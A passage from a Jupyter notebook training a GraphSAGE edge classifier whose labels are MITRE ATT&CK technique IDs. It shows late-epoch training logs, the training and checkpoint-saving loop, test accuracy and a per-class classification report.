      "2024-01-31 13:22:26 | INFO | Validation Loss: 1.0119 | Validation Accuracy: 0.8100\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "cc68490cabde4160b205f8703a464489",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:22:43 | INFO | Epoch 181 | Train Loss: 0.1986 | Train Accuracy: 0.9575\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1cb87bd31579414ab2d5ad13a8b98857",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:22:44 | INFO | Validation Loss: 1.0973 | Validation Accuracy: 0.8113\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d786496ab5d54df08bf23115b62ec5c3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:23:02 | INFO | Epoch 182 | Train Loss: 0.1960 | Train Accuracy: 0.9581\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2ca7d45559de4ab7b286a7e30bbcaf7f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:23:03 | INFO | Validation Loss: 1.1687 | Validation Accuracy: 0.7932\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a48002a2972b471395fce182bfea78c7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:23:20 | INFO | Epoch 183 | Train Loss: 0.1924 | Train Accuracy: 0.9590\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "94999a42ed524ed69357bb211c1c0a63",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:23:22 | INFO | Validation Loss: 0.9305 | Validation Accuracy: 0.8190\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5c7f74abcc5e44709ca3077aa7862973",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:23:38 | INFO | Epoch 184 | Train Loss: 0.2031 | Train Accuracy: 0.9570\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "928bd18b046d41bda6ac72c4b2876aa9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:23:40 | INFO | Validation Loss: 1.1125 | Validation Accuracy: 0.8078\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "024f9093a49c41f59bc3eccb75491a41",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:23:56 | INFO | Epoch 185 | Train Loss: 0.1912 | Train Accuracy: 0.9594\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7c9d1beba0754c8a88a813255615c2ed",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:23:58 | INFO | Validation Loss: 1.0649 | Validation Accuracy: 0.8070\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c7e75a09c0954c6089e3deab4ce406a6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:24:14 | INFO | Epoch 186 | Train Loss: 0.2041 | Train Accuracy: 0.9565\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "37496b6803e646f3a46304bcbea21dc8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:24:16 | INFO | Validation Loss: 1.0741 | Validation Accuracy: 0.8061\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "99d38676b7cd4090943e8305fd7066e1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:24:36 | INFO | Epoch 187 | Train Loss: 0.2004 | Train Accuracy: 0.9577\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "544880d8c203494aa9fd3c915e44acfa",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:24:37 | INFO | Validation Loss: 0.9755 | Validation Accuracy: 0.8291\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d4f5a333001e48708a48d375db10c142",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:24:56 | INFO | Epoch 188 | Train Loss: 0.1910 | Train Accuracy: 0.9590\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9dce1c6019ab4b12bf1f1297dfaefc4c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:24:57 | INFO | Validation Loss: 1.1007 | Validation Accuracy: 0.8086\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e187090f1ec5489ea8a3da315b6d401d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:25:14 | INFO | Epoch 189 | Train Loss: 0.1939 | Train Accuracy: 0.9590\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3fbe6c8f688b4a2e9a4ef81c38170fd3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:25:16 | INFO | Validation Loss: 0.9761 | Validation Accuracy: 0.8315\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "77b47348a22e463c896dc0084be5bb78",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:25:32 | INFO | Epoch 190 | Train Loss: 0.1936 | Train Accuracy: 0.9585\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3d099ad123f64b44a62a8f33ba4065e4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:25:33 | INFO | Validation Loss: 1.1862 | Validation Accuracy: 0.7988\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c48efbe16a0c4dbe98c3b36bf9b80efb",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:25:49 | INFO | Epoch 191 | Train Loss: 0.1888 | Train Accuracy: 0.9595\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "df7c6565d8cf4f6b99e516f6d062500e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:25:51 | INFO | Validation Loss: 0.9517 | Validation Accuracy: 0.8225\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a167d4ae64384268b54a1866a0e73f2d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:26:07 | INFO | Epoch 192 | Train Loss: 0.1967 | Train Accuracy: 0.9582\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4ad8bc481a48490390e4721fe6d1ed64",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:26:08 | INFO | Validation Loss: 0.9054 | Validation Accuracy: 0.8210\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "933fc112602d460699d5f0c7a11d6477",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:26:27 | INFO | Epoch 193 | Train Loss: 0.2050 | Train Accuracy: 0.9558\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2013fd3c470f4618b3d659f99c3a6e11",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:26:29 | INFO | Validation Loss: 0.8699 | Validation Accuracy: 0.8184\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f25fa71af13d4e9aaa75cc3954cf0aa8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:26:45 | INFO | Epoch 194 | Train Loss: 0.1956 | Train Accuracy: 0.9581\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a4c34799edf84c38bd3926326e9f0f06",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:26:47 | INFO | Validation Loss: 1.0495 | Validation Accuracy: 0.8216\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f7137411edb245ec93cf702f6f61ea0d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:27:03 | INFO | Epoch 195 | Train Loss: 0.1898 | Train Accuracy: 0.9594\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c1fa5dac7dd343ab8f9c5fbfd45c2446",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:27:05 | INFO | Validation Loss: 0.9381 | Validation Accuracy: 0.8366\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4e24f9da2b174a4eb2be1f3d07e538c5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:27:20 | INFO | Epoch 196 | Train Loss: 0.1904 | Train Accuracy: 0.9596\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fcfd7c5a501f4766bc8ae3214eaee816",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:27:22 | INFO | Validation Loss: 0.9541 | Validation Accuracy: 0.8114\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f1b14048787f4bb6b725add1a60b5168",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:27:38 | INFO | Epoch 197 | Train Loss: 0.1919 | Train Accuracy: 0.9588\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e1fc6100ce8d4aeb83813f42cebaba80",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:27:40 | INFO | Validation Loss: 0.9417 | Validation Accuracy: 0.8174\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2600c30468784215afad4902dd6c1d80",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:27:56 | INFO | Epoch 198 | Train Loss: 0.1987 | Train Accuracy: 0.9576\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2ad23118a10043a4a9bbccd649600e59",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:27:58 | INFO | Validation Loss: 1.1820 | Validation Accuracy: 0.7950\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "227c4ae10806462a92454f8ba420caba",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:28:14 | INFO | Epoch 199 | Train Loss: 0.1969 | Train Accuracy: 0.9575\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e268cee9252a4195911ae551cffc0305",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:28:16 | INFO | Validation Loss: 0.8323 | Validation Accuracy: 0.8561\n",
      "\n"
     ]
    }
   ],
   "source": [
    "same_seeds(42)\n",
    "model = Model(in_features=len(node_ent2emb[0]), hidden_features=64, out_features=128, num_classes=len(label2index), edge_embedding_dim = len(edge_ent2emb[0]))\n",
    "model = model.to(device)\n",
    "optimizer = AdamW(model.parameters(), lr=5e-4)\n",
    "scheduler = lr_scheduler.CosineAnnealingLR(optimizer, T_max=20, eta_min=0, last_epoch=- 1, verbose=False)\n",
    "criterion = nn.CrossEntropyLoss()\n",
    "model_save_path = \"./model/GraphSAGE_transE_256\"\n",
    "best_model_path = ''\n",
    "\n",
    "best_val_loss = float('inf')\n",
    "\n",
    "if not os.path.isdir(model_save_path):\n",
    "    os.makedirs(model_save_path)\n",
    "\n",
    "epochs = 200\n",
    "best_val_loss = float('inf')\n",
    "best_val_acc = float('-inf')\n",
    "best_model_path = \"\"\n",
    "for epoch in tqdm(range(epochs)):\n",
    "    model.train()\n",
    "    total_loss = 0.0\n",
    "    total_accuracy = 0.0    \n",
    "    for data in tqdm(train_dataloader):\n",
    "        loss, accuracy, _ = model_fn(data, model, criterion, device, which_type='train')        \n",
    "        optimizer.zero_grad()\n",
    "        loss.backward()\n",
    "        optimizer.step()\n",
    "\n",
    "        total_loss += loss.item()\n",
    "        total_accuracy += accuracy.item()\n",
    "\n",
    "    scheduler.step()\n",
    "    \n",
    "    avg_loss = total_loss / len(train_dataloader)\n",
    "    avg_accuracy = total_accuracy / len(train_dataloader)\n",
    "    logging.info(f'Epoch {epoch} | Train Loss: {avg_loss:.4f} | Train Accuracy: {avg_accuracy:.4f}')\n",
    "    \n",
    "    # Validation Part\n",
    "    model.eval()\n",
    "    total_accuracy = 0.0\n",
    "    total_loss = 0.0\n",
    "    with torch.no_grad():\n",
    "        for data in tqdm(valid_dataloader):\n",
    "            loss, accuracy, _ = model_fn(data, model, criterion, device, which_type='validation')\n",
    "            total_accuracy += accuracy.item()\n",
    "            total_loss += loss.item()\n",
    "\n",
    "    avg_accuracy = total_accuracy / len(valid_dataloader)\n",
    "    current_loss = total_loss / len(valid_dataloader)\n",
    "    # if current_loss < best_val_loss and avg_accuracy > best_val_acc:\n",
    "    if current_loss < best_val_loss:\n",
    "        best_val_loss = current_loss\n",
    "        best_val_acc = avg_accuracy\n",
    "        best_model_path = f'{model_save_path}/epoch_{epoch}_loss_{current_loss:.4f}_acc_{avg_accuracy:.4f}'\n",
    "        print(\"Best Model Found!! \", best_model_path)\n",
    "        \n",
    "    logging.info(f'Validation Loss: {current_loss:.4f} | Validation Accuracy: {avg_accuracy:.4f}\\n')    \n",
    "    torch.save(model.state_dict(), f'{model_save_path}/epoch_{epoch}_loss_{current_loss:.4f}_acc_{avg_accuracy:.4f}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "id": "30c34e7d-d1bd-4cf2-9aee-1e0d480d5ee6",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'./model/GraphSAGE_transE_256/epoch_27_loss_0.5811_acc_0.8727'"
      ]
     },
     "execution_count": 35,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "best_model_path"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "id": "2d315dd6",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-31 13:28:18 | INFO | Test Accuracy: 92.0424 %\n",
      "\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# load the pretrained model\n",
    "model.load_state_dict(torch.load(best_model_path))\n",
    "\n",
    "model.to(device)\n",
    "model.eval()\n",
    "\n",
    "total = 0\n",
    "correct = 0\n",
    "true_labels = []\n",
    "predicted_labels = []\n",
    "with torch.no_grad():\n",
    "    for data in test_dataloader:\n",
    "        loss, accuracy, predicted = model_fn(data, model, criterion, device, which_type='test')\n",
    "        labels = data.edata['label'].to(device)\n",
    "        \n",
    "        true_labels.extend(labels.cpu().numpy())\n",
    "        predicted_labels.extend(predicted.cpu().numpy())\n",
    "                \n",
    "        total += labels.size(0)\n",
    "        correct += (predicted == labels).sum().item()\n",
    "\n",
    "logging.info(f'Test Accuracy: {100 * correct / total:.4f} %\\n\\n\\n')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "id": "77a3a939",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/media/Raid6_disk/bai/anaconda3/envs/DGL/lib/python3.10/site-packages/sklearn/metrics/_classification.py:1497: UndefinedMetricWarning: Precision is ill-defined and being set to 0.0 in labels with no predicted samples. Use `zero_division` parameter to control this behavior.\n",
      "  _warn_prf(average, modifier, f\"{metric.capitalize()} is\", len(result))\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "report output at:  ./result/GraphSAGE_emb256/result.csv\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/media/Raid6_disk/bai/anaconda3/envs/DGL/lib/python3.10/site-packages/sklearn/metrics/_classification.py:1497: UndefinedMetricWarning: Precision is ill-defined and being set to 0.0 in labels with no predicted samples. Use `zero_division` parameter to control this behavior.\n",
      "  _warn_prf(average, modifier, f\"{metric.capitalize()} is\", len(result))\n",
      "/media/Raid6_disk/bai/anaconda3/envs/DGL/lib/python3.10/site-packages/sklearn/metrics/_classification.py:1497: UndefinedMetricWarning: Precision is ill-defined and being set to 0.0 in labels with no predicted samples. Use `zero_division` parameter to control this behavior.\n",
      "  _warn_prf(average, modifier, f\"{metric.capitalize()} is\", len(result))\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>label</th>\n",
       "      <th>precision</th>\n",
       "      <th>recall</th>\n",
       "      <th>f1-score</th>\n",
       "      <th>support</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>T1112_34041639e6e501856ecaf5969ee29c76_I</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>42.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>T1547.001_1f15ab22c39a9b6bb2bb0d77276dfcb3_I</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>90.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>T1499_2fe2d5e6-7b06-4fc0-bf71-6966a1226731_B</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>20.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>T1036.003_04e8d83e7badf098d50800d6aa1dd487_B</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>22.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>T1562.002_6a8d25d65a7d481dc479f89c62af1e6a_I</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>40.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>272</th>\n",
       "      <td>T1119_7121cdf93b951311be9d7078c602efdc_B</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>23.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>273</th>\n",
       "      <td>T1115_70795de7cbb842edb029b3378c27c008_B</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>22.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>274</th>\n",
       "      <td>accuracy</td>\n",
       "      <td>0.920424</td>\n",
       "      <td>0.920424</td>\n",
       "      <td>0.920424</td>\n",
       "      <td>0.920424</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>275</th>\n",
       "      <td>macro avg</td>\n",
       "      <td>0.022454</td>\n",
       "      <td>0.014988</td>\n",
       "      <td>0.014912</td>\n",
       "      <td>814055.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>276</th>\n",
       "      <td>weighted avg</td>\n",
       "      <td>0.892812</td>\n",
       "      <td>0.920424</td>\n",
       "      <td>0.887740</td>\n",
       "      <td>814055.000000</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>277 rows × 5 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                            label  precision    recall  \\\n",
       "0        T1112_34041639e6e501856ecaf5969ee29c76_I   0.000000  0.000000   \n",
       "1    T1547.001_1f15ab22c39a9b6bb2bb0d77276dfcb3_I   0.000000  0.000000   \n",
       "2    T1499_2fe2d5e6-7b06-4fc0-bf71-6966a1226731_B   0.000000  0.000000   \n",
       "3    T1036.003_04e8d83e7badf098d50800d6aa1dd487_B   0.000000  0.000000   \n",
       "4    T1562.002_6a8d25d65a7d481dc479f89c62af1e6a_I   0.000000  0.000000   \n",
       "..                                            ...        ...       ...   \n",
       "272      T1119_7121cdf93b951311be9d7078c602efdc_B   0.000000  0.000000   \n",
       "273      T1115_70795de7cbb842edb029b3378c27c008_B   0.000000  0.000000   \n",
       "274                                      accuracy   0.920424  0.920424   \n",
       "275                                     macro avg   0.022454  0.014988   \n",
       "276                                  weighted avg   0.892812  0.920424   \n",
       "\n",
       "     f1-score        support  \n",
       "0    0.000000      42.000000  \n",
       "1    0.000000      90.000000  \n",
       "2    0.000000      20.000000  \n",
       "3    0.000000      22.000000  \n",
       "4    0.000000      40.000000  \n",
       "..        ...            ...  \n",
       "272  0.000000      23.000000  \n",
       "273  0.000000      22.000000  \n",
       "274  0.920424       0.920424  \n",
       "275  0.014912  814055.000000  \n",
       "276  0.887740  814055.000000  \n",
       "\n",
       "[277 rows x 5 columns]"
      ]
     },
     "execution_count": 40,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "report_data = classification_report(true_labels, predicted_labels, output_dict=True)\n",
    "report_df = pd.DataFrame(report_data).transpose()\n",
    "\n",
